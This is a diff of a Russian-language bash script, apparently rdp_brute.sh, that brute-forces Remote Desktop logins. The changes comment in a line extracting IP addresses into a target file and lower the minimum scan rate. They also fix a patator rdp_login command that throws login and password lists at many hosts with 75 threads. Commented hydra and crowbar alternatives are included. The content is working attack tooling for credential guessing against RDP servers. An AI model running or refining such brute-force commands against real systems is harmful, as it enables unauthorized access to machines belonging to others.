@@ -12,6 +12,8 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
+#cat paused.conf | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+
 rm -rf Results/ paused.conf list all_results 2> /dev/null
 }
 ########################################TESTROOT######################################
@@ -7717,7 +7719,7 @@ rate=$(echo $raten | sed -e 's/[^0-9]//g')
 }
 while rate_f
 do
-	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+	if [[ $rate -gt 9 && $rate -lt 30001 ]];
 		then
 echo -e "                       Значение rate установлено $rate$green"
 echo ""
@@ -29426,7 +29428,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2 port=FILE3 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2  0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
